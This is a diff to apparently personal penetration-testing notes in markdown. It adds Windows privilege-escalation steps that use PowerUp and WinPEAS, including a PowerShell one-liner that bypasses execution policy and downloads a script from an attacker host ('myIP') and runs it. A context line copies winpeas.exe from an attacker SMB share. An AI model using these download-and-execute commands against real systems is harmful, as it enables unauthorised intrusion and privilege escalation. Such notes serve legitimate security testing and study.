@@ -25,7 +25,12 @@
 3. `copy \\myIP\smb\winpeas.exe   \windows\temp\winpeas.exe` 
 
  ## Privilege Escalation for Window
- 0.
+ 0. Use PowerUp
+ 1. `Import-Module .\PowerUp.ps1`
+ 2. `Invoke-AllChecks`
+ 3. or `powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://myIP:80/PowerUp.ps1');Invoke-AllChecks"`
+ 4. Use WinPeas
+ 5. `winpeas.exe`
  
 
 ## File Transfer to Linux victim
